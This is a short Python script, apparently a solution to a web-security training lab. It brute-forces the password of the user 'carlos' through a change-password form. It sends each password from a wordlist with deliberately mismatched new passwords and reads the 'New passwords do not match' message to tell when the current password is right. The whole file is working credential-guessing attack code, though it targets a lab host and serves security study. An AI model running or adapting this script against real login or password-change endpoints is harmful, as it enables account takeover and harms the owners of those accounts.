import requests
passwords = open('passwords.txt','r').read().split('\n')

for password in passwords :
    data = {'username':"carlos",'current-password':password,'new-password-1':'..','new-password-2':'.'}

    reqlog = requests.post('https://ac801fd41eff9a34c0e80d4900bf00ef.web-security-academy.net/my-account/change-password',data)

    msg = 'New passwords do not match'
    #print(f"Testing {password}")
    if msg in reqlog.text:
        print(password)
        break
